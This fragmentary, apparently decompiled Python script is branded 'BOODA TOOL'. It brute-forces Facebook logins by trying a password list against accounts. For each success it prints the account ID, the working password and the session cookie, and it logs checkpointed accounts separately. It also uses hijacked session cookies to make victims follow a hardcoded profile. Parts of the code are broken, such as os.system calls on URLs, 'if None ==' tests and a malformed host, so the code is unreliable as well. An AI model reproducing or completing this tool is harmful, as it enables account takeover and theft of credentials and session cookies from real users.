...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('https://www.facebook.com/profile.php?id=100085701982549')
        FD()
        return None
...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('https://www.facebook.com/HajiBoooda.1')
        return None
    if None == '3':
        os.system('https://www.facebook.com/HajiBoooda.1 ')
        return None
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://,.facebook.com/profile.php?id=100015315258519', {
...
\033[1;37m================= \33[32;45mBOODA\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mBOODA\33[0;m\033[1;32m && \033[1;33mBOODA\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m PRINCE BOODA
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mBOODA
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mZEA
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
\033[1;37m================= \33[32;45mBOODA\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO BOODA TOOL\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(BOODA-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(BOODA-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[BOODA] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
